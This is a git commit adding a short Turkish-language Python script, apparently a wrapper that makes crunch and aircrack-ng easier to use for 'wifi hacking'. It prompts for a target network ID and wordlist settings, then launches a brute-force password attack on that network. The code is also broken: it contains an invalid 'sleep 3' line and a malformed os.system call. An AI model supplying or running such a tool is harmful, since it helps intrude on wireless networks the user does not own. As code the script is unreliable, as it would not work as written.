2a80e9504e2087bbe15000310a29ee54ca66e045
m1ke-adams <87667679+m1ke-adams@users.noreply.github.com>
2021-07-19 21:04:02 +0300

    Add files via upload

---
+++ mike-ng.py
@@ -0,0 +1,13 @@
+import os
+
+input ("yapımcı: mike adams, bu yazılım crunch kullanımını kolaylaştırmak için yapılmıştır. 19.07.2021")
+input ("wifi hacking python")
+sayimin = input("wordlist için minimum uzunluk sayısı: ")
+sayimax = input("wordlist için maximum uzunluk sayısı: ")
+harfler = input("wordlistte ne tür karakterler olacak: ")
+id = input("attack yapacağınız internetin id'si: ")
+dosyayol = input("dosya yolu nereye kaydedeceksiniz: ")
+input("saldırı başlatılıyor...")
+sleep 3
+os.system("crunch", sayimin, sayimax, harfler, "| aircrack-ng -b", id, dosyayol, "-w-")
+print("saldırı işlemi bitti.")
